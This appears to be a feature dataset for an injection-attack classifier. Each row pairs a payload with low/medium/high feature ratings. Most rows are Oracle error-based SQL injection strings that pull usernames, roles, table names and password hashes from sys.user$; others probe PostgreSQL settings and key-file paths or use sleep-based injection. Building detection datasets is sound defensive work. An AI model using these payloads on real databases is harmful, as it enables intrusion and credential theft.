attack	d_char	d_token_sqli	d_token_xss	d_token_ci	punck	s_token	space	length	output
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=2)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=2)) and 'i'='i	H	H	L	L	M	H	H	H	
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=3)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=3)) and 'i'='i	H	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=3)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=3)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=3)) and 'i'='i	H	H	L	L	M	H	H	H	
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=4)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=4)) and 'i'='i	H	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=4)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=4)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=4)) and 'i'='i	H	H	L	L	M	H	H	H	
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=5)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=5)) and 'i'='i	H	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=5)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=5)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=5)) and 'i'='i	H	H	L	L	M	H	H	H	
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=6)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=6)) and 'i'='i	H	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=6)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=6)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=6)) and 'i'='i	H	H	L	L	M	H	H	H	
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=7)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=7)) and 'i'='i	H	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=7)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=7)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=7)) and 'i'='i	H	H	L	L	M	H	H	H	
' and 1=utl_inaddr.get_host_address((select distinct(username) from (select distinct(username), rownum as limit from sys.all_users) where limit=8)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(password) from (select distinct(password), rownum as limit from sys.user$) where limit=8)) and 'i'='i	H	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(table_name) from (select distinct(table_name), rownum as limit from sys.all_tables) where limit=8)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(column_name) from (select distinct(column_name), rownum as limit from all_tab_columns) where limit=8)) and 'i'='i	M	H	L	L	M	M	M	H	
' and 1=utl_inaddr.get_host_address((select distinct(granted_role) from (select distinct(granted_role), rownum as limit from dba_role_privs where grantee=sys.loginuser) where limit=8)) and 'i'='i	H	H	L	L	M	H	H	H	
select current_setting('log_connections');	L	M	L	L	M	L	L	M	
select current_setting('log_statement');	L	M	L	L	M	L	L	M	
select current_setting('port');	L	M	L	L	M	L	L	M	
select current_setting('password_encryption');	L	M	L	L	M	L	L	M	
select current_setting('krb_server_keyfile');	L	M	L	L	M	L	L	M	
select current_setting('virtual_host');	L	M	L	L	M	L	L	M	
select current_setting('port');	L	M	L	L	M	L	L	M	
select current_setting('config_file');	L	M	L	L	M	L	L	M	
select current_setting('hba_file');	L	M	L	L	M	L	L	M	
select current_setting('data_directory');	L	M	L	L	M	L	L	M	
sleep(1) /*‘ or sleep(1) or ‘“ or sleep(1) or “*/	L	M	L	M	M	M	M	M	
sleep(1) /*' or sleep(1) or '" or sleep(1) or "*/	M	M	L	M	M	M	M	M	
